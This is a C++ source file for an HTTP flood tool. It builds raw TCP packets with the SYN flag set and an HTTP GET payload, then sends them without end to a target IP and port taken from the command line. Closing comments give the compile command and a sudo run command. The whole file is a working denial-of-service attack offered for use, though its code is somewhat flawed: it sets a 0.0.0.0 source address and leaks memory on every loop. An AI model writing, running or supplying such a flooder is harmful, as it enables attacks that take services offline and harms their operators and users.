#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Calculate checksum
uint16_t calculate_checksum(uint16_t *data, int length) {
    uint32_t sum = 0;
    while (length > 1) {
        sum += *data++;
        length -= 2;
    }
    if (length) {
        sum += *(uint8_t *)data;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// Create and send HTTP packet
void send_http_request(const char* target_ip, uint16_t target_port) {
    while (true)
    {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(target_port);
        dest_addr.sin_addr.s_addr = inet_addr(target_ip);

        // HTTP Request
        const char* http_request = "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n";
        size_t http_request_len = strlen(http_request);

        // TCP Header
        struct tcphdr tcp;
        memset(&tcp, 0, sizeof(tcp));
        tcp.source = htons(12345); // Arbitrary source port
        tcp.dest = htons(target_port);
        tcp.seq = 0;
        tcp.ack_seq = 0;
        tcp.doff = 5; // TCP header size (5 * 4 = 20 bytes)
        tcp.fin = 0;
        tcp.syn = 1; // SYN flag
        tcp.rst = 0;
        tcp.psh = 0;
        tcp.ack = 0;
        tcp.urg = 0;
        tcp.window = htons(5840); // Maximum allowed window size
        tcp.check = 0; // Leave checksum 0 now, fill later
        tcp.urg_ptr = 0;

        // IP Header
        struct iphdr ip;
        memset(&ip, 0, sizeof(ip));
        ip.ihl = 5;
        ip.version = 4;
        ip.tot_len = htons(sizeof(ip) + sizeof(tcp) + http_request_len);
        ip.ttl = 64;
        ip.protocol = IPPROTO_TCP;
        ip.saddr = inet_addr("0.0.0.0"); // Source IP address
        ip.daddr = dest_addr.sin_addr.s_addr;

        // Pseudo header needed for TCP checksum calculation
        struct pseudo_header psh;
        memset(&psh, 0, sizeof(psh));
        psh.source_address = ip.saddr;
        psh.dest_address = ip.daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(tcp) + http_request_len);

        // Calculate TCP checksum
        int tcp_size = sizeof(tcp) + http_request_len;
        char *pseudo_packet = new char[sizeof(pseudo_header) + tcp_size];
        memcpy(pseudo_packet, &psh, sizeof(pseudo_header));
        memcpy(pseudo_packet + sizeof(pseudo_header), &tcp, sizeof(tcp));
        memcpy(pseudo_packet + sizeof(pseudo_header) + sizeof(tcp), http_request, http_request_len);
        tcp.check = calculate_checksum(reinterpret_cast<uint16_t*>(pseudo_packet), sizeof(pseudo_header) + tcp_size);
        delete[] pseudo_packet;

        // Full Packet
        char* packet = new char[sizeof(ip) + sizeof(tcp) + http_request_len];
        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &tcp, sizeof(tcp));
        memcpy(packet + sizeof(ip) + sizeof(tcp), http_request, http_request_len);

        // Send the packet
        if (sendto(sockfd, packet, sizeof(ip) + sizeof(tcp) + http_request_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            close(sockfd);
            delete[] packet;
            exit(EXIT_FAILURE);
        }

        std::cout << "HTTP request sent to " << target_ip << ":" << target_port << std::endl;

        close(sockfd);
        // delete[] packet;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <target_port>" << std::endl;
        return EXIT_FAILURE;
    }

    const char* target_ip = argv[1];
    uint16_t target_port = static_cast<uint16_t>(atoi(argv[2]));
    send_http_request(target_ip, target_port);

    return EXIT_SUCCESS;
}
// g++ -o http_flood http_flood.cpp
// sudo ./http_flood <target_ip> <target_port>
